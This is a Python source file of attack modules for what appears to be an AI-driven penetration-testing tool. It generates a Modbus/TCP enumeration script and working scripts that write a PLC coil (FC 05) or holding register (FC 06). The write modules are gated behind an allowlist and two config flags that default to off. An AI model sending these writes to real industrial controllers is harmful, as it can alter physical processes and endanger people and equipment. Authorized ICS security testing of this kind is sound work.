"""Attack modules: ICS/SCADA/IoT enumeration (READ-ONLY / non-disruptive).

Phase 6.3 adds **write-side ICS modules** (``ModbusWriteCoil``,
``ModbusWriteRegister``, ``S7PlcStop``, ``S7PlcStart``) for authorized PLC
testing. Write-side ICS is **destructive risk** — a coil/register write or a
PLC stop can change physical process state. The dual gate is:

1. ``@require_allowlist()`` on ``run_attack_module`` (already enforced at the
   MCP tool layer in ``tools/mcp_tools/attack_modules.py:1185``) — the target
   IP must be in the operator's allowlist.
2. ``ics.allow_write: true`` in ``config.yaml`` (default **false**) — an
   explicit per-tool config flag the operator must set to authorize write-side
   ICS. Read-only enum (the original modules above) works without it.

A write-side module's ``run()`` checks ``_ics_write_allowed()`` and refuses
(blocked) when the flag is false, so even if the allowlist lets the target
through, the write never happens without the second gate. See the physical-
damage warning in README §Configuration → ``ics.allow_write``.
"""

from __future__ import annotations

import os
from typing import Any

from tools.attack_modules.base import AttackModule, ModuleContext
from tools.attack_modules.modules.ics.bacnet import _WRITE_BLOCKED_NOTE


def _ics_write_allowed() -> bool:
    """Return True only when BOTH ``ics.allow_write: true`` AND
    ``ics.destructive_ics: true`` are set in config.

    Phase 1 safety: two independent flags must be set before any ICS write
    module (ModbusWriteCoil/ModbusWriteRegister/S7PlcStop/S7PlcStart) can
    fire. The checked-in ``config.yaml`` defaults both to false so the
    repository is safe-by-default; an operator who has explicit written
    authorization for destructive PLC testing sets both explicitly. This
    is the second gate of the dual lock; the first is
    ``@require_allowlist()`` on ``run_attack_module`` (target must be in
    the allowlist). The Flow B ``scope_gate._HARD_FORBIDDEN_ACTIONS`` block
    does NOT cover ICS writes (it is Flow B only); the live gate is here
    + ``@require_allowlist``.
    """
    config_path = os.environ.get("AI_NMAP_CONFIG_PATH") or "config.yaml"
    try:
        import yaml  # local import keeps the module importable without PyYAML

        with open(config_path, "r", encoding="utf-8") as handle:
            cfg = yaml.safe_load(handle) or {}
    except Exception:
        return False
    ics_cfg = cfg.get("ics", {}) or {}
    return bool(ics_cfg.get("allow_write", False)) and bool(ics_cfg.get("destructive_ics", False))


class ModbusEnum(AttackModule):
    name = "ModbusEnum"
    description = (
        "Enumerate Modbus/TCP unit/slave IDs and read device identification "
        "(vendor/product) via function code 43 / 04. READ-ONLY: no coil/register writes."
    )
    target_services = ["modbus", "tcp"]
    target_ports = [502]
    required_cves: list[str] = []
    # Capability metadata: read-only Modbus enumeration.
    requires = []
    produces = []
    read_only = True
    cost = "low"
    phase_hint = "enumerate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Read-only Modbus/TCP enumeration. Sends Read Device Identification "
                "(FC 43/0x0E) with a Read Input Registers (FC 04) fallback to unit IDs "
                "1..247. No write function codes (05/06/15/16) are used."
            ),
            "evidence": [f"Modbus FC43 device-id enumeration; unit-id sweep 1-247 against {ctx.target_ip}"],
            "references": [
                "modbus.org MODBUS Messaging on TCP/IP Implementation Guide v1.0b",
                "MBFuncCode 43 Read Device Identification (Encapsulated Interface Transport)",
            ],
            "suggested_command": f"nmap --script modbus-discovery -p 502 {ctx.target_ip}",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''#!/usr/bin/env python3
"""Modbus/TCP enumeration -- READ-ONLY / non-disruptive enumeration.

No coil/register writes, no control commands. Only read function codes are
used: function code 43 (Read Device Identification, subcode 0x0E Encapsulated
Interface Transport) with a function code 04 (Read Input Registers, count 1,
start addr 0) fallback to detect which unit/slave IDs respond. The write-side
function codes 05/06/15/16 are NEVER sent. Connects only to the single
authorized target.
"""
import json
import socket
import struct
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = 502
TIMEOUT = 3.0
# read-only function codes only -- NO write function codes (05/06/15/16)
FC_READ_DEVICE_ID = 43       # 0x2B -- Encapsulated Interface Transport
SUBCODE_READ_DEV_ID = 0x0E   # 0x0E -- Read Device Identification
FC_READ_INPUT_REGISTERS = 4  # 0x04 -- Read Input Registers (read-only)

tx_counter = 0


def build_adu(unit_id: int, pdu: bytes) -> bytes:
    """Build a Modbus/TCP ADU (MBAP header + PDU). Transaction id increments."""
    global tx_counter
    tx_counter += 1
    # MBAP: transaction id (2) + protocol id 0 (2) + length (2) + unit id (1)
    length = len(pdu) + 1  # +1 for unit id byte
    mbap = struct.pack(">HHHB", tx_counter, 0x0000, length, unit_id)
    return mbap + pdu


def read_device_identification(unit_id: int) -> bytes:
    """PDU for FC 43 subcode 0x0E (Read Device Identification, read-id 0 basic)."""
    # MEI type 0x0E, readDevId code 0 (basic), object id 0
    return struct.pack(">BBBB", FC_READ_DEVICE_ID, SUBCODE_READ_DEV_ID, 0x00, 0x00)


def read_input_registers_fallback(unit_id: int) -> bytes:
    """PDU for FC 04 Read Input Registers, count 1, start address 0 (read-only)."""
    return struct.pack(">BHH", FC_READ_INPUT_REGISTERS, 0x0000, 0x0001)


def query(unit_id: int, pdu: bytes) -> bytes | None:
    """Send one ADU and return the response payload (or None on failure)."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((TARGET, PORT))
            s.send(build_adu(unit_id, pdu))
            # MBAP header is 7 bytes; read it first then the rest by length field
            hdr = s.recv(7)
            if len(hdr) < 7:
                return None
            _txn, _proto, length, _uid = struct.unpack(">HHHB", hdr)
            rest = s.recv(length - 1) if length > 1 else b""
            return hdr[6:7] + rest
    except Exception:
        return None


def parse_device_id(resp: bytes) -> dict:
    """Parse a Read Device Identification response (FC 43 / 0x0E)."""
    if len(resp) < 6:
        return {{}}
    # resp[0] = unit id, resp[1] = FC (43), resp[2] = MEI type (0x0E),
    # resp[3] = readDevId code, resp[4] = conformity level, resp[5] = more follows,
    # resp[6] = next object id, resp[7] = num objects
    try:
        mei = resp[2]
        if mei != SUBCODE_READ_DEV_ID:
            return {{}}
        num_obj = resp[7]
        idx = 8
        objs = {{}}
        for _ in range(num_obj):
            if idx + 2 > len(resp):
                break
            obj_id = resp[idx]
            obj_len = resp[idx + 1]
            idx += 2
            val = resp[idx:idx + obj_len].decode(errors="replace")
            idx += obj_len
            objs[obj_id] = val
        # Object ids: 0=VendorName, 1=ProductCode, 2=ProductName, 3=ModelName, 4=UserAppName
        return {{
            "vendor": objs.get(0, ""),
            "product_code": objs.get(1, ""),
            "product_name": objs.get(2, ""),
            "model": objs.get(3, ""),
        }}
    except Exception:
        return {{}}


def main() -> None:
    results = []
    for unit_id in range(1, 248):  # Modbus unit/slave IDs 1..247
        resp = query(unit_id, read_device_identification(unit_id))
        if resp and len(resp) >= 2 and resp[1] == FC_READ_DEVICE_ID:
            info = parse_device_id(resp)
            results.append({{"unit_id": unit_id, "method": "FC43", "info": info}})
            continue
        # fallback: read input registers (read-only) to detect presence
        resp = query(unit_id, read_input_registers_fallback(unit_id))
        if resp and len(resp) >= 2 and resp[1] == FC_READ_INPUT_REGISTERS:
            results.append({{"unit_id": unit_id, "method": "FC04_input_registers", "info": {{}}}})
    print(json.dumps({{"target": TARGET, "port": PORT, "units": results}}, indent=2))


if __name__ == "__main__":
    main()
'''


class ModbusWriteCoil(AttackModule):
    """Write a single Modbus/TCP coil (FC 05) — DESTRUCTIVE.

    Changes physical process state. Dual-gated: ``@require_allowlist()`` on
    ``run_attack_module`` (target in allowlist) AND ``ics.allow_write: true``
    in config. Refuses with a blocked status when the write flag is false.
    """

    name = "ModbusWriteCoil"
    description = (
        "Write a single Modbus/TCP coil (function code 05) to a target unit. "
        "DESTRUCTIVE: changes physical process state. Requires ics.allow_write: true."
    )
    target_services = ["modbus", "tcp"]
    target_ports = [502]
    required_cves: list[str] = []
    # Phase 1: hard-gate applicability at 0 unless both ics.allow_write +
    # ics.destructive_ics are armed in config. Defense in depth with the
    # run() _ics_write_allowed() re-check.
    destructive_ics = True
    # Capability metadata: destructive coil write; operator-authorized, needs foothold.
    requires = ["foothold"]
    produces = []
    read_only = False
    cost = "high"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        if not _ics_write_allowed():
            return {
                "status": "blocked",
                "module": self.name,
                "target_ip": ctx.target_ip,
                "note": _WRITE_BLOCKED_NOTE,
            }
        return {
            "status": "script_generated",
            "module": self.name,
            "script": self.generate_python_script(ctx),
            "note": (
                "DESTRUCTIVE Modbus/TCP coil write (FC 05). Requires "
                "ics.allow_write: true + target in allowlist. Connects only "
                "to the single authorized target."
            ),
            "references": [
                "modbus.org MODBUS Messaging on TCP/IP Implementation Guide v1.0b",
                "MBFuncCode 05 Write Single Coil (destructive)",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''#!/usr/bin/env python3
"""Modbus/TCP coil write (FC 05) -- DESTRUCTIVE / write-side.

Requires ics.allow_write: true (enforced by the caller) + target in allowlist
(enforced by @require_allowlist on run_attack_module). Connects only to the
single authorized target. Write function code 05 (Write Single Coil) is used.
"""
import json
import socket
import struct
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = 502
TIMEOUT = 3.0
FC_WRITE_COIL = 5  # 0x05 -- Write Single Coil (destructive)
tx_counter = 0


def build_adu(unit_id: int, pdu: bytes) -> bytes:
    global tx_counter
    tx_counter += 1
    length = len(pdu) + 1
    mbap = struct.pack(">HHHB", tx_counter, 0x0000, length, unit_id)
    return mbap + pdu


def write_coil(unit_id: int, address: int, value: bool) -> bytes:
    """PDU for FC 05 Write Single Coil. value=True -> 0xFF00, False -> 0x0000."""
    return struct.pack(">BHH", FC_WRITE_COIL, address, 0xFF00 if value else 0x0000)


def query(unit_id: int, pdu: bytes) -> bytes | None:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((TARGET, PORT))
            s.send(build_adu(unit_id, pdu))
            hdr = s.recv(7)
            if len(hdr) < 7:
                return None
            _txn, _proto, length, _uid = struct.unpack(">HHHB", hdr)
            rest = s.recv(length - 1) if length > 1 else b""
            return hdr[6:7] + rest
    except Exception:
        return None


def main() -> None:
    # ponytail: single coil write at address 0, unit 1. The operator edits
    # address/value/unit for their authorized PLC test.
    resp = query(1, write_coil(1, 0, True))
    print(json.dumps({{"target": TARGET, "port": PORT, "wrote": resp is not None}}))


if __name__ == "__main__":
    main()
'''


class ModbusWriteRegister(AttackModule):
    """Write a single Modbus/TCP holding register (FC 06) — DESTRUCTIVE.

    Changes physical process state. Dual-gated like ``ModbusWriteCoil``.
    """

    name = "ModbusWriteRegister"
    description = (
        "Write a single Modbus/TCP holding register (function code 06) to a target "
        "unit. DESTRUCTIVE: changes process state. Requires ics.allow_write: true."
    )
    target_services = ["modbus", "tcp"]
    target_ports = [502]
    required_cves: list[str] = []
    destructive_ics = True
    # Capability metadata: destructive register write; operator-authorized, needs foothold.
    requires = ["foothold"]
    produces = []
    read_only = False
    cost = "high"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        if not _ics_write_allowed():
            return {
                "status": "blocked",
                "module": self.name,
                "target_ip": ctx.target_ip,
                "note": _WRITE_BLOCKED_NOTE,
            }
        return {
            "status": "script_generated",
            "module": self.name,
            "script": self.generate_python_script(ctx),
            "note": (
                "DESTRUCTIVE Modbus/TCP holding-register write (FC 06). Requires "
                "ics.allow_write: true + target in allowlist."
            ),
            "references": [
                "MBFuncCode 06 Write Single Register (destructive)",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''#!/usr/bin/env python3
"""Modbus/TCP holding-register write (FC 06) -- DESTRUCTIVE / write-side.

Requires ics.allow_write: true + target in allowlist. Connects only to the
single authorized target.
"""
import json
import socket
import struct
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = 502
TIMEOUT = 3.0
FC_WRITE_REGISTER = 6  # 0x06 -- Write Single Register (destructive)
tx_counter = 0


def build_adu(unit_id: int, pdu: bytes) -> bytes:
    global tx_counter
    tx_counter += 1
    length = len(pdu) + 1
    mbap = struct.pack(">HHHB", tx_counter, 0x0000, length, unit_id)
    return mbap + pdu


def write_register(unit_id: int, address: int, value: int) -> bytes:
    return struct.pack(">BHH", FC_WRITE_REGISTER, address, value & 0xFFFF)


def query(unit_id: int, pdu: bytes) -> bytes | None:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((TARGET, PORT))
            s.send(build_adu(unit_id, pdu))
            hdr = s.recv(7)
            if len(hdr) < 7:
                return None
            _txn, _proto, length, _uid = struct.unpack(">HHHB", hdr)
            rest = s.recv(length - 1) if length > 1 else b""
            return hdr[6:7] + rest
    except Exception:
        return None


def main() -> None:
    resp = query(1, write_register(1, 0, 1))
    print(json.dumps({{"target": TARGET, "port": PORT, "wrote": resp is not None}}))


if __name__ == "__main__":
    main()
'''
